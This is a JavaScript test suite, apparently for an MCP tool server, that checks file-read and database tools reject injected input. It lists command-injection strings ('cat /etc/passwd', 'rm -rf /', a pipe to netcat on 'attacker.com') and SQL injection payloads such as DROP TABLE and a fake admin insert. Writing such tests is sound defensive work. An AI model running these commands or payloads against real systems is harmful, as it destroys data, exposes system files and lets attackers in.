// Comprehensive input validation test suite
import { MCPTestClient } from '@mcp/test-utils';

describe('Input Validation Security', () => {
    let client;

    beforeEach(() => {
        client = new MCPTestClient('http://localhost:3000');
    });

    test('prevents command injection in shell tools', async () => {
        const maliciousInputs = [
            'valid.txt; cat /etc/passwd',
            'test`whoami`',
            'file$(rm -rf /)',
            'test\nrm -rf /',
            'test|nc attacker.com 4444'
        ];

        for (const input of maliciousInputs) {
            const response = await client.callTool('file_read', {
                path: input
            });

            // Should either sanitize or reject malicious input
            expect(response.error || response.sanitized).toBeTruthy();
            expect(response.output).not.toContain('passwd');
        }
    });

    test('prevents SQL injection in database tools', async () => {
        const sqlInjectionPayloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; INSERT INTO admins VALUES ('hacker', 'password')"
        ];

        for (const payload of sqlInjectionPayloads) {
            const response = await client.callTool('db_query', {
                query: `SELECT * FROM users WHERE id = '${payload}'`
            });

            // Must use parameterized queries
            expect(response.error?.code).toBe('INVALID_QUERY');
        }
    });
});
